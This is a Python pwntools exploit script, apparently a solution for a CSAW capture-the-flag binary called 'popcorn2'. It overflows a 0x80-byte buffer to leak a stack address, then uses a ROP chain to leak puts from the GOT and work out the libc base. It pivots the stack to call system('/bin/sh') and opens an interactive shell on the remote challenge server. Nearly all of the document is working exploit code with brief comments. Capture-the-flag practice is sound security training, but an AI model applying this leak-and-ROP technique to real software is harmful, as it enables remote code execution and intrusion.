#!/usr/bin/env python2
from pwn import *
from mypwntools import *  # ~/workspace/tools/mypwntools/
import logging
import coloredlogs
from binascii import hexlify

# shellcodes['binsh32']
# shellcodes['binshx86_64']
# gethex(string)

coloredlogs.install()
log = logging.getLogger("Exploit")

# context.log_level = 'critical'
context.terminal = ["alacritty", "-e", "sh", "-c"]

BINARY = "./popcorn2"
HOST, PORT = "pwn.chal.csaw.io", 1004
LIBC_PATH = "/usr/lib/libc.so.6"
if "--live" in sys.argv:
    LIBC_PATH = "./libc.so.6"

GDB_SETUP = """
set follow-fork-mode child
p __libc_start_main
c
"""

if "--live" not in sys.argv:
    p = process(BINARY)
    if "--debug" in sys.argv:
        gdb.attach(p, GDB_SETUP)
else:
    p = remote(HOST, PORT)

if LIBC_PATH:
    libc = ELF(LIBC_PATH)

# Note to watch out for newlines - they will overflow into the next input
pop_rbp = p64(0x0000000000401129) # pop rbp; ret
pop_rsp = p64(0x0000000000401235) # pop rsp; pop r13; pop r14; pop r15; ret;
pop_rdi = p64(0x000000000040123b) # pop rdi; ret
puts_got = 0x404018 # addr of puts@got.plt

# write space - 1 As in the first get_pop() call
payload = ""
payload += "A" * (0x80 - 1)

raw_input()

p.sendline(payload)
print('sent: ' + payload)

print('got: ' + p.recvuntil("A" * (0x80 - 1)))
print('got: ' + p.recvline())
leak = p.recvline()[:-1]
leak = leak + "\x00" * (8 - len(leak))
stack_leak = u64(leak)  # esp, address of buffer
print("got leak: " + hex(stack_leak))

buf_addr = stack_leak - 0xa0

# set up a leak for puts
payload = ""
payload += pop_rdi
payload += p64(puts_got)
payload += p64(0x40119a) # addr of first call to puts in get_pop

while len(payload) < 0x80:
    payload = payload + "A"
payload += p64(buf_addr - 0x8)  # 
payload += p64(0x4011cb) # mov eax, 0x0; lea; ret;


#send the leak payload and get the leak
p.recv(timeout = 0.1)
p.sendline(payload)
p.recvline()
puts_leak = p.recvline()
puts_leak = u64(puts_leak[:-1] + '\x00' * (8 - len(puts_leak[:-1])))
print('puts: ' + hex(puts_leak))

# calculate the base address of libc from the leak of puts
libc_base = puts_leak - libc.symbols['puts']
# get the gadget at libc + 0x4484f (this is going to be system)
gadget = libc_base + 0x4484f
if '--live' not in sys.argv:
    gadget = libc_base + 0xc9cfd

print('gadget: ' + hex(gadget))

# form the payload for the system() call
payload = ''
# this is the stuff at the front of our buffer that we will jump to below
payload += pop_rdi
payload += p64(libc_base + next(libc.search('/bin/sh\x00')))
payload += p64(libc_base + libc.symbols['system'])
# fill the rest of the buffer

while len(payload) < 0x80:
    payload = payload + "B"
# payload to jump to our (now known) buffer address
payload += p64(buf_addr - 0x80)
payload += p64(0x4011cb) # mov eax, 0x0; lea; ret

p.sendline(payload)

p.interactive()

